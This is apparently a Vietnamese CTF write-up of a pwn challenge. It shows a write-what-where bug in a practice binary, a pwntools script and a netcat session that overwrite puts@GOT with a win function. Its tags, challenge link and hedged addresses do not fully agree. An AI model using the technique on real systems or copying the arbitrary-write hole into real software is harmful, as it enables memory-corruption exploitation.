---
title: "What you have - 0xFUN CTF Write Up"
date: 2026-02-28
tags: [PascalCTF, pwn]
description: "My team's write up for 0xFUN contest"
---

> Problem link: https://ctf.0xfun.org/challenges#Chip8%20Emulator-70
> Category: Pwn
> Points: 100
> Level: Easy


## Phân tích

### Source code

```c
#include <stdio.h>
#include <stdint.h>

int main(int argc, const char **argv, const char **envp) {
    uint64_t *address_to_write; // [rsp+8h] [rbp-18h]
    uint64_t value_buffer[2];   // [rsp+10h] [rbp-10h]

    setbuf(stdout, NULL);

    // Bước 1: Yêu cầu nhập địa chỉ (WHERE)
    puts("Show me what you GOT!");
    scanf("%lu", &address_to_write); 

    // Bước 2: Yêu cầu nhập giá trị (WHAT)
    puts("Show me what you GOT! I want to see what you GOT!");
    scanf("%lu", &value_buffer[0]);

    // Bước 3: GHI GIÁ TRỊ VÀO ĐỊA CHỈ - LỖ HỔNG!
    *address_to_write = value_buffer[0];

    puts("Goodbye!");
    return 0;
}
```

### Lỗ hổng: Write-What-Where

Đây là lỗ hổng **arbitrary write** (ghi tùy ý), cho phép:
- **WHERE**: Người dùng chọn địa chỉ bất kỳ để ghi
- **WHAT**: Người dùng chọn giá trị bất kỳ để ghi vào địa chỉ đó

Gợi ý "Show me what you **GOT**" ám chỉ **GOT (Global Offset Table)** - bảng lưu địa chỉ các hàm thư viện.

### Kỹ thuật khai thác: GOT Overwrite

#### Ý tưởng:
1. Ghi đè địa chỉ của `puts@GOT` bằng địa chỉ hàm `win()` (nếu có)
2. Khi chương trình gọi `puts("Goodbye!")`, thực chất sẽ nhảy đến hàm `win()` → in flag

#### Điều kiện:
- Binary **No PIE** → địa chỉ cố định
- **Partial RELRO** → GOT có thể ghi được
- Có hàm `win()` trong binary để in flag

### Tìm địa chỉ

Từ phân tích binary:
- **puts@GOT**: `0x404000` (hoặc địa chỉ tương tự tùy binary)
- **win function**: `0x401236` (hoặc địa chỉ tương tự)

## Exploit

### Script Python (pwntools)

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

# Kết nối đến server
p = remote("chall.0xfun.org", 61453)

# Địa chỉ (cần điều chỉnh theo binary thực tế)
puts_got = 0x404000  # puts@GOT
win_func = 0x401236  # win function

# Gửi địa chỉ để ghi (WHERE)
p.recvuntil(b"Show me what you GOT!")
p.sendline(str(puts_got).encode())

# Gửi giá trị để ghi (WHAT)
p.recvuntil(b"Show me what you GOT! I want to see what you GOT!")
p.sendline(str(win_func).encode())

# Nhận flag
p.interactive()
```

### Chạy thủ công

```bash
$ nc chall.0xfun.org 61453
Show me what you GOT!
4210688          # 0x404000 = puts@GOT (decimal)
Show me what you GOT! I want to see what you GOT!
4198966          # 0x401236 = win (decimal)
Goodbye!         # Thực ra gọi win() → in flag
0xfun{...}
```

## Giải thích chi tiết

### Tại sao GOT Overwrite hoạt động?

```
Trước khi khai thác:
┌─────────────────┐
│ puts@GOT        │ → 0x7f... (địa chỉ puts trong libc)
└─────────────────┘

Sau khi khai thác:
┌─────────────────┐
│ puts@GOT        │ → 0x401236 (địa chỉ win function)
└─────────────────┘

Khi gọi puts("Goodbye!"):
1. Program tra GOT để tìm địa chỉ puts
2. GOT trả về 0x401236 (win) thay vì puts thật
3. Program nhảy đến win() → in flag!
```

### Chuyển đổi địa chỉ sang decimal

Vì `scanf("%lu")` đọc số **unsigned long** (decimal):
- `0x404000` = `4210688` (decimal)
- `0x401236` = `4198966` (decimal)

Python: `print(int("0x404000", 16))` → `4210688`

## Tổng kết

| Bước | Hành động |
|------|-----------|
| 1 | Phân tích source → phát hiện write-what-where |
| 2 | Nhận ra gợi ý "GOT" → GOT overwrite |
| 3 | Tìm puts@GOT và địa chỉ win function |
| 4 | Ghi đè puts@GOT bằng win |
| 5 | Khi puts() được gọi → thực thi win() → FLAG! |